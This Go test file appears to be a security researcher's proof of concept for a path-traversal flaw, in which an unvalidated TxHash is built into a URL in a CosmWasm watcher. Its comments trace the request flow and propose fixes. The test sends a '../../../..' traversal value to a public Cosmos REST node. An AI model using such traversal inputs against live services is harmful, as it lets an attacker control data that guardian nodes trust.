package cosmwasm

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"testing"
	"time"
)

/*
Secondary context bug:
- Restricted behind a Guardian making the request though. So, some good news!
- Doesn't seem to be input validation on the provided data for the TxHash
- The Go request follows redirects according to docs.
- So, either hitting around endpoint where ALL of the data is controlled or finding an arbitrary redirect on any endpoint leads to compromise.

Reobservation request flow:
- Admin server:
  - GetAndObserveMissingVAAs writes to this particular channel.
  - Used as a web service by Guardians who have an API key for their box.
  - Converts hex string to bytes

- handleReobservationRequests:
  - Inputs are a TxHash (byte array) and chain id
  - Based on the chain ID, it writes to a particular channel
  - Has a channel that is waiting to be written to

- CosmWasm parser:
  - Takes in the request
  - Looks at the `TxHash` field.
  - Adds it to a URL
  - Makes the request

Fixes:
- Validate the JSON before using it
- Validate that the txhash is sane
*/
func TestMakeDirectoryTraversal(t *testing.T) {
	client := &http.Client{
		Timeout: time.Second * 5,
	}

	tx := "../../../../cosmos/bank/v1beta1/balances/cosmos1mvas6843pv3cmuwrk3pszpqkrfwhrysxx2s9fd"
	//tx = "2BD2C41778BFECA0A70E44E4ACF95E347212E69DFD49A4DD9B8042534E34BDBB"
	req, err := http.NewRequestWithContext(
		context.Background(),
		http.MethodGet,
		fmt.Sprintf("%s/cosmos/tx/v1beta1/txs/%s", "https://cosmos-rest.publicnode.com:443/", tx),
		bytes.NewBuffer([]byte{0}),
	)
	if err != nil {
		fmt.Println("Error:", err)
		panic("Error!")
	}

	// Breaking the URL parser probably isn't viable but still something to consider - https://web-assets.claroty.com/exploiting-url-parsing-confusion.pdf
	resp, err := client.Do(req)

	if err != nil {
		fmt.Println("Error:", err)
		panic("Error!")
	}

	txBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error:", err)
		panic("Error!")
	}

	txJSON := string(txBody)
	fmt.Println(txJSON)
	//txJSON = "{\"tx\":{\"a\": \"\LF\"}}"

	// https://github.com/google/gson/issues/2295
	// " This function expects that the json is well-formed, and does not validate." lol - https://github.com/tidwall/gjson/blob/c2bc5a409a229e55cd1ba59b6cfd5fe1488d6f0f/gjson.go#L2010
	//txHashRaw := gjson.Get(txJSON, "tx")
	//fmt.Println(txHashRaw)
}
